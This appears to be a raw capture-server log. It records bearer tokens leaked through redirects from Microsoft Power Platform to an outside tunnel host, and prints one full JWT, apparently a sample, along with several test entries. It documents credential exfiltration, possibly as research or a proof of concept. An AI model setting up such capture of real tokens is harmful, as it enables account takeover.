[2026-03-14 15:07:19] [CAPTURE_NODE_01] INBOUND REDIRECT LEAK
----------------------------------------------------------------
SOURCE_IP: [REDACTED_FOR_SECURITY]
TARGET_URI: http://22f2f1647fc9fc.lhr.life/leak_verified
USER_AGENT: Mozilla/5.0 (Microsoft Power Platform Runtime)
LEAKED_HEADER: Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...[TRUNCATED_SENSITIVE_DATA]
----------------------------------------------------------------
nohup: ignoring input
Ghostbuster Listener V2 active on 8080...

[2026-03-14 17:25:53] [CAPTURE_NODE_01] INBOUND REDIRECT LEAK
USER_AGENT: Mozilla/5.0 (Microsoft Power Platform Runtime)
LEAKED_HEADER: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkRhdmlkIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
----------------------------------------------------------------

[2026-03-14 17:42:32] [CAPTURE_NODE_01] INBOUND REDIRECT LEAK
USER_AGENT: curl/8.19.0
LEAKED_HEADER: Bearer V3.2_STABILITY_TEST_PASSED
----------------------------------------------------------------

[2026-03-15 05:31:01] [CAPTURE_NODE_01] INBOUND REDIRECT LEAK
USER_AGENT: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36
LEAKED_HEADER: Not Found
----------------------------------------------------------------
